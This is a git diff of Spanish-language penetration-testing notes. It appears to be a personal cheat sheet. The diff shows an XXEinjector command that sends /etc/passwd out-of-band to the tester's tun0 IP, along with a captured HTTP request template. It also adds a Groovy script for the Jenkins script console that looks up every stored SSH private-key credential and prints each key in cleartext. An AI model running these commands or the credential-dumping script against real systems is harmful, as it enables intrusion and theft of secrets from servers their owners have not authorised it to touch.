@@ -7,6 +7,7 @@
 - [SSRF](./ssrf.md)
 - Podemos utilizar [XXEinjector](https://github.com/enjoiz/XXEinjector) para automatizar el proceso de inyección de XML externa.
 - `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` Nos tenemos que guardar la petición HTTP de burp
+
 ```
 POST /blind/submitDetails.php HTTP/1.1
 
@@ -33,4 +34,31 @@ Connection: keep-alive
 
 
 <?xml version="1.0" encoding="UTF-8"?>
-XXEINJECT```
+XXEINJECT
+```
+
+
+## Jenkins script que busca clave SSH
+
+```groovy
+import com.cloudbees.plugins.credentials.CredentialsProvider
+import com.cloudbees.plugins.credentials.common.StandardUsernameCredentials
+import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
+import hudson.model.*
+
+// Buscar todas las credenciales en el sistema
+def creds = CredentialsProvider.lookupCredentials(
+    BasicSSHUserPrivateKey.class, 
+    Jenkins.instance, 
+    null, 
+    null
+)
+
+// Iterar sobre las credenciales y mostrar las claves privadas
+creds.each { cred ->
+    println "ID: ${cred.id}"
+    println "Description: ${cred.description}"
+    println "Private Key: ${cred.privateKey}"
+    println "----------------------------------------"
+}
+```
